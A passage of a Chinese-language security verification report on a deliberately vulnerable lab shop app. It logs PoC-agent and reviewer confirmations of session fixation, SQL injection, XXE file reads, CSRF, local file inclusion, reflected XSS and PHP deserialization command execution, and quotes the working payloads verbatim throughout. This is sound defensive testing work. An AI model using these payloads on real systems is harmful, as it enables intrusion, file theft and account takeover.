  - 已观测作业 ID：`85e95ae2db244d58a23e22a99bf87ca8`；`12c1efa24d6543f491788c336abdc84e`；`da4b62e2feb74afeacab6268dfb38c6d`；`56af24eafaf944af9d61c04d0bca9216`
  - 结论结束原因：completed；执行阶段结束原因：sdk_interrupt_error
  - 作业：`da4b62e2feb74afeacab6268dfb38c6d` script finished exit=0；`56af24eafaf944af9d61c04d0bca9216` script finished exit=0；`85e95ae2db244d58a23e22a99bf87ca8` http finished exit=0
  - 适配脚本：`64d47497-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常侧作业 da4b62e2feb74afeacab6268dfb38c6d（stdout ev-bd986b74a8b187f5），攻击侧作业 56af24eafaf944af9d61c04d0bca9216（stdout ev-8ec30a06a0aee5c0）。早期作业 12c1efa24d6543f491788c336abdc84e 的 400 系脚本误写 O:12（DispatchJob 实为 11 字符）导致 unserialize 失败，未作为结论依据；修正后对照成立。alice GET /ops/jobs.php 返回 403（ev-17d1d16648f926dc），证明入口要求 operator/admin。服务端诊断 capability_unavailable，未用日志作根因依据。

- 正式复核 `4419475a75834695882cebcaae5d13f1`：复核确认；引用 revision 1 / verification `64d4749733f947ed9b5391e4d5c9dc76`
  - 理由：双侧观测完整且可判别：正常侧提交页面自带载荷输出 inventory-ready，落库 jobs id=388 details=inventory-ready；攻击侧仅替换公有属性 command 为 printf LAB30DSER_5f3a1c，POST 200 响应 <pre> 与复查 jobs id=389 details 均出现唯一标记，证明 shell_exec 执行了攻击者指定命令并落库，非正常表单输出可产生。alice 访问 /ops/jobs.php 403 与源码 require_user(['operator','admin']) 一致，前提如实。验证成功，确认反序列化命令执行。
  - 复核观测：正常侧 operator 登录后 GET /ops/jobs.php 得到表单与 csrf；直接提交页面自带默认载荷（服务端 $example：O:11:"DispatchJob":1:{s:7:"command";s:22:"printf inventory-ready";}）→ POST 200，"任务已导入并执行"，响应 <pre>inventory-ready</pre>，复查页面 jobs 表新行 id=388 details=inventory-ready（只读 GET 再次确认）。；攻击侧 同一 operator 会话、同一表单 csrf、同一端点与序列化结构，仅将 command 改为 printf LAB30DSER_5f3a1c（载荷 O:11:"DispatchJob":1:{s:7:"command";s:23:"printf LAB30DSER_5f3a1c";}）→ POST 200，响应 <pre>LAB30DSER_5f3a1c</pre>；随后 GET /ops/jobs.php 读回 jobs 表新行 id=389，details=LAB30DSER_5f3a1c。该唯一标记只可能来自 shell_exec 执行攻击者提供的命令字符串，而非任何表单正常输出。

### C-18 登录入口接受外部 SID 且认证成功后不换发会话，导致会话固定

- verification `11efd0e16a3a495da9de174a041e5cbe`（finding `8514fe5a09b24a97b2b9200edd85f915` revision 1，context `442ace88c24d4d9da7657b08210f4ed7`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常对照 job 6795a9d39ad84af682598f5d6c1b5268（alice）：不带 sid 访问 /auth/login.php，服务端生成随机 SID 41a78c0e9aa75858f2bdb14f9dad3a71；alice 普通表单登录 200 FINAL http://lab30/，订单页 200 含 SG-1001；用攻击者猜测的未知 SID guessprobe16bf94900X 请求 /orders/index.php 返回 401（请先登录后使用此功能）。该 SID 由服务端生成，攻击者无法预知。
  - 攻击侧观测：受害腿 job bc2d5cd67e7f4738a0a84b304cc07dbc（alice）：GET /auth/login.php?sid=atk95c0451b2d0aec404f64 返回 Set-Cookie SHOPSESSID=atk95c0451b2d0aec404f64，MATCH_ATTACKER True；随后站内提交正常登录表单，VICTIM_LOGIN 200 FINAL http://lab30/，VICTIM_SID_AFTER_LOGIN 仍为该值，ROTATED False，订单页 200 含 SG-1001。攻击者复用 job 87b05ffa618747cb81f3d994490adce8（identity guest，未发送凭据）：仅带 Cookie SHOPSESSID=atk95c0451b2d0aec404f64 请求 /orders/index.php 返回 200，订单号 ['SG-1001']；/wallet/index.php 返回 200，balance 100.00；未知 SID 请求钱包 401。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `40efcb1af8184c02b5461134cb299049`；本次未重新执行该历史作业。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`6795a9d39ad84af682598f5d6c1b5268`；`bc2d5cd67e7f4738a0a84b304cc07dbc`；`c11d7872cfbd47b4a9ce92027230b061`；`87b05ffa618747cb81f3d994490adce8`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`6795a9d39ad84af682598f5d6c1b5268` script finished exit=0；`bc2d5cd67e7f4738a0a84b304cc07dbc` script finished exit=0；`c11d7872cfbd47b4a9ce92027230b061` script finished exit=0；`87b05ffa618747cb81f3d994490adce8` script finished exit=0
  - 适配脚本：`11efd0e1-adapted-poc.php`（见证据包 evidence/）
  - 备注：ev-5fc5614ad6c0e740（job bc2d5cd6…）记录 SID 投递、登录后未轮换、受害者自读订单；ev-96bcb174d3ebde29（job 87b05ffa…，identity guest）记录未认证攻击者仅凭固定 SID 读取 alice 订单与钱包。受害腿作业身份为 alice，未计入 attack_job_ids，仅列入 jobs 与攻击侧引用。另有 job c11d7872cfbd47b4a9ce92027230b061 以相同 SID 得到 200/SG-1001，与 guest 结果一致。正常登录前后同样未换发 SID，但其值随机且攻击者不可知，因此可利用点在于外部 sid 被接受并继承认证态。

- 正式复核 `444e72a5dc114c039a44769b41dc7c84`：复核确认；引用 revision 1 / verification `11efd0e16a3a495da9de174a041e5cbe`
  - 理由：正常侧 job 6795a9d39ad84af682598f5d6c1b5268：不带 sid 访问 /auth/login.php 获服务端随机 SID 41a78c0e9aa75858f2bdb14f9dad3a71，alice 登录 200 后订单 200 含 SG-1001，攻击者猜的未知 SID 请求订单页返回 401，表明正常会话不可预知。攻击侧 job bc2d5cd67e7f4738a0a84b304cc07dbc：GET /auth/login.php?sid=atk95c0451b2d0aec404f64 返回 Set-Cookie 同值（MATCH True），站内登录 200 后 SID 仍为原值（ROTATED False）；job 87b05ffa618747cb81f3d994490adce8 以 guest 身份仅携带该 Cookie 请求订单返回 200 SG-1001、钱包 200 balance 100.00。投递/认证/复用/轮换四环节与源码 login.php:3,7-9 与 bootstrap.php:13-18 一致，会话固定成立；未测登出与写操作属实验局限，不影响定性。
  - 复核观测：正常侧 正常对照 job 6795a9d39ad84af682598f5d6c1b5268（alice）：不带 sid 访问 /auth/login.php，服务端生成随机 SID 41a78c0e9aa75858f2bdb14f9dad3a71；alice 普通表单登录 200 FINAL http://lab30/，订单页 200 含 SG-1001；用攻击者猜测的未知 SID guessprobe16bf94900X 请求 /orders/index.php 返回 401（请先登录后使用此功能）。该 SID 由服务端生成，攻击者无法预知。；攻击侧 受害腿 job bc2d5cd67e7f4738a0a84b304cc07dbc（alice）：GET /auth/login.php?sid=atk95c0451b2d0aec404f64 返回 Set-Cookie SHOPSESSID=atk95c0451b2d0aec404f64，MATCH_ATTACKER True；随后站内提交正常登录表单，VICTIM_LOGIN 200 FINAL http://lab30/，VICTIM_SID_AFTER_LOGIN 仍为该值，ROTATED False，订单页 200 含 SG-1001。攻击者复用 job 87b05ffa618747cb81f3d994490adce8（identity guest，未发送凭据）：仅带 Cookie SHOPSESSID=atk95c0451b2d0aec404f64 请求 /orders/inde…

### C-19 ops/members.php 会员查询参数 q 经 member_lookup 拼接进 SQL 造成注入

- verification `b9a479ce0a054a29aa015a892bc98455`（finding `6ea737d111da4451a1c0cbab2c63aa92` revision 1，context `operator-d080e73f70b14490be1e1cdf6b452385`，target —）
  - 执行状态：执行完成；判定：confirmed；来源：operator
  - 正常侧观测：同一 operator 会话 q=alice 返回仅含 alice 的单行成员记录。
  - 攻击侧观测：仅将 q 改为引号+OR 1=1+注释，200 返回多名成员且包含 bob；原筛选条件被改变。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`5bca6c029e9148fcbd3b9e30be055dac`
  - 结论结束原因：operator_experiment_completed；执行阶段结束原因：未记录
  - 作业：`5bca6c029e9148fcbd3b9e30be055dac` script finished exit=0

- 正式复核 `b08cf606eee145f3b065049af5ed65df`：复核确认；引用 revision 1 / verification `b9a479ce0a054a29aa015a892bc98455`
  - 理由：正常侧 q=alice 返回单行 alice；攻击侧 q="' OR 1=1 -- " 返回 alice、bob、operator、admin 四行，同一 operator 会话下仅改变 q 即扩大结果集，证明拼接改写 SQL 结构，与源码 member_lookup.php:3 的拼接 sink 一致，动态观测支持注入结论。
  - 复核观测：正常侧 同一 operator 会话 q=alice 返回仅含 alice 的单行成员记录。；攻击侧 仅将 q 改为引号+OR 1=1+注释，200 返回多名成员且包含 bob；原筛选条件被改变。

### C-20 运营 XML 导入以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 导致 XXE

- verification `11b1708c52904e50ba94b3cf44f7faf5`（finding `8af981c796814905b9bdd25108e47ddb` revision 1，context `840e73ccd9d446279dc80a4083d0dba8`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 457a5a4a8b994f18a7e8f95643a9e49b（operator）：GET /ops/xml-import.php 200 并取得 48 位 csrf；POST xml=<config><title>春日上新</title></config> 返回 200，<pre> 内容为 '春日上新'，NORMAL_FORM_ERROR False，无内部标记。
  - 攻击侧观测：攻击侧作业 b1bf9a1812d643ea986a24add093c905（operator，新会话取 csrf）：POST xml=<?xml version="1.0"?><!DOCTYPE config [<!ENTITY a SYSTEM "file:///var/lib/shop/vault/internal.txt"><!ENTITY b SYSTEM "file:///etc/hostname">]><config><title>&a;&#124;&b;</title></config>，返回 200、无格式错误；<pre> 内容为 'SHOP_INTERNAL_dc5a0e5ff0bb785dde68b86e\n&#124;81ca09b06138\n'（MARKER_IN_PRE 与 HOSTNAME_IN_PRE 均为 True）。即两个外部实体的取值在解析阶段被读出并替换进 title，再经 h() 输出；textarea 中虽有 payload 原文（TEXTAREA_ECHO_HAS_FILE_URL True），但文件内容只出现在 <pre>。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `0202ac06c00b4c03abe7cc78422b9595`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`457a5a4a8b994f18a7e8f95643a9e49b`；`b1bf9a1812d643ea986a24add093c905`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`457a5a4a8b994f18a7e8f95643a9e49b` script finished exit=0；`b1bf9a1812d643ea986a24add093c905` script finished exit=0
  - 适配脚本：`11b1708c-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：xml-import.php:2 require_user(['operator','admin'])，:3 check_csrf 后 $xml=(string)$_POST['xml']，simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT&#124;LIBXML_DTDLOAD) 未带 LIBXML_NONET，$output=(string)$doc->title；:4 <pre> h($output) 输出。setup.php:34 生成随机 SHOP_INTERNAL_ 写入 /var/lib/shop/vault/internal.txt，该内容不在任何页面正常回显中，故 pre 内标记只能来自实体展开。/etc/hostname 内容 81ca09b06138 与 LFI 任务中 file:// wrapper 读到的值一致，进一步确认是本地文件读取而非回显。operator 身份由 target_prepare 核验（id=3）。

- 正式复核 `459f5102138a4606ad3a5096f78a89ce`：复核确认；引用 revision 1 / verification `11b1708c52904e50ba94b3cf44f7faf5`
  - 理由：正常侧 operator 作业 457a5a4a8b994f18a7e8f95643a9e49b 提交 <config><title>春日上新</title></config> 返回 200，pre 仅为“春日上新”、无内部标记；攻击侧 b1bf9a1812d643ea986a24add093c905 仅改 xml 为带 DOCTYPE 的两个 file:// SYSTEM 实体，返回 200 无格式错误，pre 为 SHOP_INTERNAL_ 标记与 /etc/hostname 内容，MARKER_IN_PRE 与 HOSTNAME_IN_PRE 均为 True，证明外部实体在解析阶段被展开并经 h() 回显；两作业仅 payload 不同，确认 XXE 文件读取。局限为 operator 账号前提与仅 file:// 读取，未构成反证。
  - 复核观测：正常侧 正常侧作业 457a5a4a8b994f18a7e8f95643a9e49b（operator）：GET /ops/xml-import.php 200 并取得 48 位 csrf；POST xml=<config><title>春日上新</title></config> 返回 200，<pre> 内容为 '春日上新'，NORMAL_FORM_ERROR False，无内部标记。；攻击侧 攻击侧作业 b1bf9a1812d643ea986a24add093c905（operator，新会话取 csrf）：POST xml=<?xml version="1.0"?><!DOCTYPE config [<!ENTITY a SYSTEM "file:///var/lib/shop/vault/internal.txt"><!ENTITY b SYSTEM "file:///etc/hostname">]><config><title>&a;&#124;&b;</title></config>，返回 200、无格式错误；<pre> 内容为 'SHOP_INTERNAL_dc5a0e5ff0bb785dde68b86e\n&#124;81ca09b06138\n'（MARKER_IN_PRE 与 HOSTNAME_IN_PRE 均为 True）。即两个外部实体的取值在解析阶段被读出…

### C-21 邮箱设置接口缺失 CSRF 校验，可被跨站请求伪造修改受害者邮箱

- verification `0a8067a3b2124eb38dc6cbe02ccc6d79`（finding `13160cf2233d456381d1bb93c4cebd70` revision 1，context `3e5838fae659431d9540a062d356f2d3`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`37621d257c084803a8a9cfc7672f7146`；`57ca35ba3d794f7683b9a22936675990`；`5232fbc3bc02444dbc172bd200a5a4ef`；`d754c47c50704839a90d9371a7325b14`
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error
  - 作业：`37621d257c084803a8a9cfc7672f7146` http finished exit=0；`57ca35ba3d794f7683b9a22936675990` script finished exit=0；`5232fbc3bc02444dbc172bd200a5a4ef` http finished exit=0；`d754c47c50704839a90d9371a7325b14` script finished exit=0

- verification `a47d75daaef64bbebd4a9aac5307402d`（finding `13160cf2233d456381d1bb93c4cebd70` revision 1，context `fdd1e7347e994da880124c3415fdb08d`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：基线 GET /account/settings.php（alice，job afe1d32e56e847d1bf8c927758750192）：200，表单为 <form method="post"><label>常用邮箱<input name="email" type="email" value="alice@shop.local"...>，整页无 name="csrf" 隐藏字段，初始邮箱 alice@shop.local。对照 POST /account/update.php（alice，无 csrf，body nickname=alice，job c3404df207b445f9a37356dd12ac692b）：403，正文“页面已过期，请刷新后重试。”，显示同类账户写入口的令牌校验在运行目标中生效。
  - 攻击侧观测：攻击 POST /account/settings.php（alice 已认证会话，body 仅 email=attacker-csrf%4013160.example.com，无 csrf 字段，job 56cdfea879494ce3a339a8d5b6fe5ba7）：200，正文出现“邮箱已更新。”且表单 value 已变为 attacker-csrf@13160.example.com。独立读回 GET /account/settings.php（job 5b83fb6c259643b080c395a900c1a12b）：200，value="attacker-csrf@13160.example.com"，确认写入已持久化到数据库而非仅响应回显。对照的 update.php 无令牌同请求为 403，二者差异直接定位到 settings.php 缺失 check_csrf()。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`afe1d32e56e847d1bf8c927758750192`；`56cdfea879494ce3a339a8d5b6fe5ba7`；`5b83fb6c259643b080c395a900c1a12b`；`c3404df207b445f9a37356dd12ac692b`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`afe1d32e56e847d1bf8c927758750192` http finished exit=0；`56cdfea879494ce3a339a8d5b6fe5ba7` http finished exit=0；`5b83fb6c259643b080c395a900c1a12b` http finished exit=0；`c3404df207b445f9a37356dd12ac692b` http finished exit=0
  - 备注：引用：ev-bae68410f865a5c9（基线 settings 表单无 csrf、初始邮箱 alice@shop.local）；ev-8d9cd4676de3e767（无令牌 POST 返回“邮箱已更新”及新邮箱）；ev-41e880b8918ec60a（独立读回持久化值 attacker-csrf@13160.example.com）；ev-d4bcdbf8f3d0965d（update.php 无令牌 403 对照）。源码：settings.php:3-7 无 check_csrf()、第8行表单无 csrf_field()；bootstrap.php:40 check_csrf 使用 hash_equals；update.php:4 调用 check_csrf()。服务端诊断对 http_observe 为 capability_unavailable，未作为依据。

- 正式复核 `7cdf5dcb88c24c298070eeada4cd50ca`：复核确认；引用 revision 1 / verification `a47d75daaef64bbebd4a9aac5307402d`
  - 理由：对照侧基线 GET 显示邮箱 alice@shop.local 且表单无 csrf 字段，无令牌 POST /account/update.php 返回 403；攻击侧无 csrf 字段 POST /account/settings.php 返回 200“邮箱已更新”，独立 GET 读回 attacker-csrf@13160.example.com 持久化。差异证明 settings.php 缺失 check_csrf 防线，动态观测支持 CSRF 结论；跨站 Cookie 投递受 SameSite=Lax 限制，作为前提保留。
  - 复核观测：正常侧 基线 GET /account/settings.php（alice，job afe1d32e56e847d1bf8c927758750192）：200，表单为 <form method="post"><label>常用邮箱<input name="email" type="email" value="alice@shop.local"...>，整页无 name="csrf" 隐藏字段，初始邮箱 alice@shop.local。对照 POST /account/update.php（alice，无 csrf，body nickname=alice，job c3404df207b445f9a37356dd12ac692b）：403，正文“页面已过期，请刷新后重试。”，显示同类账户写入口的令牌校验在运行目标中生效。；攻击侧 攻击 POST /account/settings.php（alice 已认证会话，body 仅 email=attacker-csrf%4013160.example.com，无 csrf 字段，job 56cdfea879494ce3a339a8d5b6fe5ba7）：200，正文出现“邮箱已更新。”且表单 value 已变为 attacker-csrf@13160.example.com。独立读回 GET /account/settings.php（job 5b83fb6c259643b080c395a900c1a12b）：200，value="attacker-csrf@13160.example.com"，确认写入已持久化到数据库而非仅响应回显。对照的 update.php 无令牌同请求为 403，二者差异直接定位到 settings.php 缺失 check_csrf()。

### C-22 运营模板预览页面将 $_GET['template'] 裸变量传入 include 导致任意本地文件包含（可延伸 RFI）

- verification `43618c5a9f2044babb37c14b87fb173d`（finding `264f7c68e27b4d749e1ecf9b3205317c` revision 1，context `58ecb62377a345b38b3140402692086d`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 8aedd1eae82a4f35b81b9dcd63dcf94d（operator）：GET /ops/template-preview.php（不带 template）返回 200，remote-template 区为空；template=http://fixtures:8080/templates/season.php 返回 200，remote-template 区渲染 '<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>'，FIXTURE_HAS_MARKER False，仅为预期的远程模板内容。
  - 攻击侧观测：攻击侧作业 f1cf58c683ab47f886930ddea507512c（operator）：把 template 换成 /var/lib/shop/vault/internal.txt，GET /ops/template-preview.php 返回 200，<section id="remote-template"> 内容为 'SHOP_INTERNAL_db428cd2e756cf7a93a69244\n'（MARKER_IN_BODY True）；用 file:///var/lib/shop/vault/internal.txt 得到同一标记，用 file:///etc/hostname 得到 '81ca09b06138\n'。即 include 操作数可指向应用目录之外任意可读文件，且 file:// 等包装协议未被限制，读出了本不应暴露的内部标记与系统文件。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `e534740e70164eccb47f9dc27e44fcd7`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`8aedd1eae82a4f35b81b9dcd63dcf94d`；`f1cf58c683ab47f886930ddea507512c`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`8aedd1eae82a4f35b81b9dcd63dcf94d` script finished exit=0；`f1cf58c683ab47f886930ddea507512c` script finished exit=0
  - 适配脚本：`43618c5a-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：template-preview.php:2 require_user(['operator','admin']) 后 $template=(string)($_GET['template']??'')；:3 if($template!=='')include $template; 无白名单/basename/realpath/协议限制。setup.php 将随机 SHOP_INTERNAL_ 标记写入 /var/lib/shop/vault/internal.txt（data_dir），docs 目录并不包含它，故该标记只能经越界 include 获得。operator 身份已由 target_prepare 核验（id=3，role=operator），与两个作业实际身份一致；两侧同一路径、同一身份，仅 template 取值不同。正常侧 fixture URL 能渲染出模板内容，说明 allow_url_include 实际为开启状态（RFI 形态可行），但本次未托管攻击者控制的远程文件。

- 正式复核 `dfc04f3b38004c869b551526e5a0111b`：复核确认；引用 revision 1 / verification `43618c5a9f2044babb37c14b87fb173d`
  - 理由：正常侧作业 8aedd1eae82a4f35b81b9dcd63dcf94d：operator 已登录，无 template 时 remote-template 区为空，template=http://fixtures:8080/templates/season.php 仅渲染合作方模板正文且 FIXTURE_HAS_MARKER False。攻击侧作业 f1cf58c683ab47f886930ddea507512c 在同一接口同一身份仅改 template 取值，/var/lib/shop/vault/internal.txt 与 file:// 变体均返回 200 并输出 SHOP_INTERNAL_db428cd2e756cf7a93a69244（MARKER_IN_BODY True），file:///etc/hostname 输出 81ca09b06138，证明 include 操作数越出应用目录可读任意文件，与 template-preview.php:3 裸 include 一致；RFI 代码执行未实测，仅作未证形态保留。
  - 复核观测：正常侧 正常侧作业 8aedd1eae82a4f35b81b9dcd63dcf94d（operator）：GET /ops/template-preview.php（不带 template）返回 200，remote-template 区为空；template=http://fixtures:8080/templates/season.php 返回 200，remote-template 区渲染 '<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>'，FIXTURE_HAS_MARKER False，仅为预期的远程模板内容。；攻击侧 攻击侧作业 f1cf58c683ab47f886930ddea507512c（operator）：把 template 换成 /var/lib/shop/vault/internal.txt，GET /ops/template-preview.php 返回 200，<section id="remote-template"> 内容为 'SHOP_INTERNAL_db428cd2e756cf7a93a69244\n'（MARKER_IN_BODY True）；用 file:///var/lib/shop/vault/internal.txt 得到同一标记，用 file:///etc/hostname 得到 '81ca09b06138\n'。即 include 操作数可指向应用目录之外任意可读文件，且 file:// 等包装协议未被限制，读出了本不应暴露的内部标记与系统文件。

### C-23 个人主页预览将 url 参数未编码写入 href 属性，构成反射型 XSS

- verification `00204fe6d4354656ac98d045eafa3a70`（finding `4afcafc91e504ef589de6fb97a6b9693` revision 1，context `2917203b6cb44302abe5ce37a71c89c6`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 5fe72694ba0b49e6b518a652d30d0447（alice 已登录浏览器会话）：访问 /account/profile.php?url=https%3A%2F%2Fexample.com%2Fhello，标题“个人主页预览 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 含“林晓 的主页”“访问个人主页”，无脚本执行。
  - 攻击侧观测：攻击侧作业 a62948c210f8444c81319121cbc9936d（alice 已登录浏览器会话）：访问 /account/profile.php?url=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22alert%28%27PWNED-HREF-7Q2Z%27%29%22%3E（即 url=""><img src=x onerror="alert('PWNED-HREF-7Q2Z')">），页面标题仍为个人主页预览，dialogs=["PWNED-HREF-7Q2Z"]，console_errors 含 img src=x 的 404；body_text 中该链接位置显示 '">访问个人主页'，说明 url 未编码地闭合了 href 属性并注入 <img onerror>，浏览器实际弹出对话框。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `20c8847c06644205ab2109b689c3ef16`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`5fe72694ba0b49e6b518a652d30d0447`；`a62948c210f8444c81319121cbc9936d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`5fe72694ba0b49e6b518a652d30d0447` browser finished exit=0；`a62948c210f8444c81319121cbc9936d` browser finished exit=0
  - 产物：`e1a305c9d1dd43aa8e85febe75f6b4bc-5fe72694ba0b49e6b518a652d30d0447-screenshot.png`
  - 备注：源码窗口 applicability=match：profile.php:2 $url=(string)($_GET['url']??$u['homepage'])，:3 '<a id="profile-link" href="'.$url.'">' 未用 h()（同页 form_input 内部有 h()）。两侧均为 alice 已登录浏览器会话（作业 precondition 显示 customer），路径与身份相同，仅 url 参数不同；以 dialogs 通道原文 PWNED-HREF-7Q2Z 作为浏览器实际执行证据，而非仅 HTTP 反射。

- 正式复核 `cd9f54f137104d8e9ecd1a6be2dcc6bf`：复核确认；引用 revision 1 / verification `00204fe6d4354656ac98d045eafa3a70`
  - 理由：正常侧作业 5fe72694ba0b49e6b518a652d30d0447（alice 已登录）访问 url=https%3A%2F%2Fexample.com%2Fhello：dialogs=[]、console_errors=[]、body_text 正常显示“访问个人主页”，无脚本执行。攻击侧作业 a62948c210f8444c81319121cbc9936d 同一 alice 会话访问 url=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22alert('PWNED-HREF-7Q2Z')%22%3E：dialogs=['PWNED-HREF-7Q2Z']，console_errors 出现 img src=x 的 404，body_text 对应位置显示 '">访问个人主页'，证明 href 属性被闭合且 onerror 脚本在浏览器实际执行。两侧差异仅来自 url 取值，与 profile.php:3 未编码拼接的静态根因一致，动态确认。
  - 复核观测：正常侧 正常侧作业 5fe72694ba0b49e6b518a652d30d0447（alice 已登录浏览器会话）：访问 /account/profile.php?url=https%3A%2F%2Fexample.com%2Fhello，标题“个人主页预览 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 含“林晓 的主页”“访问个人主页”，无脚本执行。；攻击侧 攻击侧作业 a62948c210f8444c81319121cbc9936d（alice 已登录浏览器会话）：访问 /account/profile.php?url=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22alert%28%27PWNED-HREF-7Q2Z%27%29%22%3E（即 url=""><img src=x onerror="alert('PWNED-HREF-7Q2Z')">），页面标题仍为个人主页预览，dialogs=["PWNED-HREF-7Q2Z"]，console_errors 含 img src=x 的 404；body_text 中该链接位置显示 '">访问个人主页'，说明 url 未编码地闭合了 href 属性并注入 <img onerror>，浏览器实际弹出对话框。

### C-24 会员备份恢复接口对用户输入执行 unserialize 并信任对象字段写入

- verification `e77158c128b64702857e477041d74078`（finding `a47fd652debb4f0391fe234a5d91ecd6` revision 1，context `—`，target —）
  - 执行状态：未执行；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `29dddc89d0d444ec8156562a0ab849ca`；本次未重新执行该历史作业。
  - 结论结束原因：target_reset_blocked；执行阶段结束原因：未记录
  - 备注：上一条验证上下文仍未关闭，未复位靶场。

- verification `16ca1673ec1246e9b3b05450bd389978`（finding `a47fd652debb4f0391fe234a5d91ecd6` revision 1，context `38b27ece406a40308241075cc024b994`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：作业 3a3ff61ed1414734956e246d3ada3370（alice）：BASELINE_INDEX 200 ('standard','林晓','普通会员…')，从 /account/backup.php 取得 csrf（48 位）与合法导出 LEGIT_EXPORT=TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6ODoic3RhbmRhcmQiO3M6MTE6ImRpc3BsYXlOYW1lIjtzOjY6Iuael+aZkyI7fQ==；POST 该导出返回 200 且含“会员备份已恢复。”，AFTER_NORMAL_INDEX 200 ('standard','林晓','普通会员…')，CONTROL_TIER_STD True、CONTROL_NAME_SAME True。
  - 攻击侧观测：作业 d587de55af6f4f369edf4cf7e28e0442（alice，新会话重新登录并取 csrf）：BEFORE_ATTACK_INDEX 200 ('standard','林晓','普通会员…')；仅替换 backup 字段为 base64(O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:16:"PWNED-DESER-7Q2Z";}) = TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7czoxMToiZGlzcGxheU5hbWUiO3M6MTY6IlBXTkVELURFU0VSLTdRMloiO30=；ATTACK_POST_STATUS 200、ATTACK_POST_NOTICE True、ATTACK_POST_INVALID False；AFTER_ATTACK_INDEX 200 ('gold','PWNED-DESER-7Q2Z','金卡会员：享受专属折扣与优先服务')，ATTACK_MARKER_IN_BODY True、ATTACK_GOLD True。随后提交合法导出，RESTORE_POST_STATUS 200，读回 ('standard','林晓','普通会员…')。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `2f6791744e8b499b88b9ac49545fe6fa`；本次未重新执行该历史作业。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`99601a82a8e248f9bd0b2ac111eaa2dd`；`3a3ff61ed1414734956e246d3ada3370`；`d587de55af6f4f369edf4cf7e28e0442`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`3a3ff61ed1414734956e246d3ada3370` script finished exit=0；`d587de55af6f4f369edf4cf7e28e0442` script finished exit=0
  - 适配脚本：`16ca1673-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口（applicability=match）bind：backup.php:4 base64_decode(...,true)，:5 unserialize($raw) + instanceof MemberBackup，:6 UPDATE users SET tier=?,display_name=?；src/backup.php:2-5 定义 MemberBackup 的公开 $tier/$displayName，无签名或字段校验。正常与攻击两侧均为 alice 普通会员、同一表单路径 /account/backup.php、同一 CSRF 机制；差异仅为 backup 字段值。攻击后已用合法导出恢复 tier=standard、display_name=林晓（作业 postcondition 亦为 standard）。最终 state_changes 为空。

- 正式复核 `c9f42caf85514f068cc31fc576e1251b`：复核确认；引用 revision 1 / verification `16ca1673ec1246e9b3b05450bd389978`
